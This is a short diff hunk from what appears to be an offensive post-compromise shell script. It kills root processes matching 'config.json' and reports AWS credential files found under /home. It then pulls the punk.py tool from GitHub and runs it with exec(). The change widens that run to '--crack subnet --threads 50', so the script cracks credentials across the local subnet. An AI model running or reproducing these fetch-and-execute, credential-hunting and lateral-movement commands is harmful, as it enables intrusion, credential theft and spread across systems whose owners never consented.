@@ -576,8 +576,8 @@ kill -31 $(pgrep -f -u root config.json)
 			echo 'found: /home/*/.aws/credentials'
     fi
 
-python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack
-python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack
+python -c "import urllib2;exec(urllib2.urlopen('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').read())" --no-passwd --crack subnet --threads 50
+python3 -c "import requests;exec(requests.get('https://raw.githubusercontent.com/r3vn/punk.py/master/punk.py').text)" --crack subnet --threads 50
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
